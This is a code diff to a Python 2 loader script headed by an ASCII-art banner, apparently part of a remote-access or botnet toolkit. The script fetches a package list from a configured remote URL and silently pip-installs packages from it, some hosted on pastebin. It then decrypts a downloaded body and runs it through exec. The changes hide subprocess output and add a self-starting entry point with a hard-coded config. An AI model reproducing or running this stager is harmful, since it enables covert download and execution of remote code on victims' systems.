@@ -46,7 +46,7 @@ a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
 
 
 '''
-from future import print_function
+
 import os
 import sys
 import time
@@ -128,9 +128,9 @@ def run(*args, **kwargs):
         os.chdir(os.path.expandvars('%TEMP%')) if os.name is 'nt' else os.chdir('/tmp')
         packages = json.loads(download(_conf['t'])).get(os.name).get(str(struct.calcsize('P') * 8))
         for name, url in packages.items():
-            if not subprocess.call([_pip, 'show', name], shell=True) == 0:
+            if not subprocess.call([_pip, 'show', name], 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                 execute([_pip, 'install', name])
-                if not len(execute([_pip, 'show', name])):
+                if not subprocess.call([_pip, 'show', name], 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                     if 'pastebin' not in url:
                         execute([_pip, 'install', url])
                     else:
@@ -180,3 +180,6 @@ def main(*args, **kwargs):
         body  = decrypt(_body, code)
         exec '\n\n'.join([init, body, main]) in globals()
 
+if __name__=='__main__':
+    _debug=bool('--debug' in sys.argv)
+    main(config=81126388790932157784)
